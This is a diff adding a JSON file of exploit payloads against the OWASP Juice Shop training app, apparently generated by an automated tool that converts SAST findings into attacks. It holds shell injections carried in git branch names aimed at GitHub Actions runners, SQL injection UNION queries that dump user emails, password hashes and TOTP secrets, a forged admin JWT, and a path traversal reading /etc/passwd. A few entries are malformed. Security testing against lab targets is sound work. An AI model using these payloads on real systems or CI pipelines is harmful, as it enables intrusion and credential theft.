@@ -1,0 +1,136 @@
+{
+  "metadata": {
+    "target_host": "http://juice-shop:3000",
+    "job_id": "bf2f8fd1-3ac5-40d2-901e-e3d44695f30d",
+    "generated_at": "2026-06-02T04:10:49.928646"
+  },
+  "exploits": [
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "SAST_FINDING",
+      "endpoint": "/app/juice-shop-src/.github/workflows/update-challenges-ebook.yml",
+      "headers": {},
+      "body": "poc-branch-name;echo RCE_CONFIRMED_BY_SAST_POC",
+      "expected_success_regex": "RCE_CONFIRMED_BY_SAST_POC"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "N/A",
+      "endpoint": "SAST_FINDING",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"vulnerable_parameter\": \"github.ref_name\", \"payload\": \"main\";id;#\"}",
+      "expected_success_regex": "uid=\\d+\\([a-zA-Z0-9_-]+\\) gid=\\d+\\([a-zA-Z0-9_-]+\\)"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "SAST_PAYLOAD",
+      "endpoint": "/app/juice-shop-src/.github/workflows/update-challenges-www-legacy.yml",
+      "headers": {},
+      "body": "main\"; id; #",
+      "expected_success_regex": "uid=\\d+\\([a-zA-Z0-9_]+\\) gid=\\d+\\([a-zA-Z0-9_]+\\)"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "GIT_COMMANDS",
+      "endpoint": "SAST_FINDING",
+      "headers": {},
+      "body": "# This is not an HTTP request. The vulnerability is in a GitHub Actions workflow and is triggered by git commands.\n# 1. Create a branch with a malicious name containing a command injection payload.\ngit checkout -b 'poc-branch;id;#'\n\n# 2. Push the malicious branch to the remote repository to trigger the GitHub Action.\ngit push origin 'poc-branch;id;#'\n\n# The 'id' command will be executed on the GitHub Actions runner because the workflow file uses ${{ github.ref_name }} insecurely in a 'run' step.",
+      "expected_success_regex": "uid=\\d+\\(runner\\) gid=\\d+\\(docker\\)"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "GIT_COMMANDS",
+      "endpoint": "SAST_FINDING",
+      "headers": {},
+      "body": "git checkout -b 'v1.0-fix;id;whoami' && git commit --allow-empty -m 'poc' && git push origin 'v1.0-fix;id;whoami'",
+      "expected_success_regex": "uid=\\d+\\([a-zA-Z0-9_\\-]+\\) gid=\\d+\\([a-zA-Z0-9_\\-]+\\) groups=\\d+\\([a-zA-Z0-9_\\-]+\\)"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=' UNION SELECT null,email,password,null,null,null,null,null,null FROM Users--",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "admin@juice-sh.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=x%27%29%29%20OR%201%3D1--",
+      "headers": {
+        "Accept": "application/json, text/plain, */*"
+      },
+      "body": "",
+      "expected_success_regex": "(?=.*\"name\":\"Apple Juice\")(?=.*\"name\":\"OWASP Juice Shop Logo\")"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "SAST_FINDING?q=a')) UNION SELECT '1',email,password,'4','5','6','7','8','9' FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--",
+      "headers": {
+        "Accept": "application/json, text/plain, */*"
+      },
+      "body": null,
+      "expected_success_regex": "admin@juice-sh.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,null from Users--",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "",
+      "expected_success_regex": "\"name\":\"admin@juice-sh\\.op\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+      "severity": "Warning",
+      "method": "GET",
+      "endpoint": "/rest/user/whoami",
+      "headers": {
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifSwiaWF0IjoxNzA0MDY3MjAwfQ.h_2eWMAp5yD6Gk1J8a80a0o2wL-23LSy1f1IMK2aHvo"
+      },
+      "body": null,
+      "expected_success_regex": "\"email\":\"admin@juice-sh.op\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+      "severity": "Warning",
+      "method": "GET",
+      "endpoint": "/ftp/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.md",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "root:.*:0:0"
+    }
+  ]
+}
